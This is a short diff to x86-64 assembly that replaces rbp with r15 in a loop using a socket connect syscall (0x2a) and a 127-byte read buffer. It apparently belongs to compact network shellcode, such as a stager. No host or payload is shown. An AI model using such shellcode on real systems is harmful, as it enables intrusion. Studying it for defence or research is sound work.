@@ -7,7 +7,7 @@ loop:
     pop rax
     push rbx
     pop rdi
-    lea rsi, [rbp + 0x17]
+    lea rsi, [r15 + 0x17]
     push byte 0x7f
     pop rdx
     xor r10, r10
@@ -38,6 +38,6 @@ socket:
     mov al, 0x2a
     syscall
     ; store loop
-    lea rbp, [rel loop]
-    jmp rbp
+    lea r15, [rel loop]
+    jmp r15
 
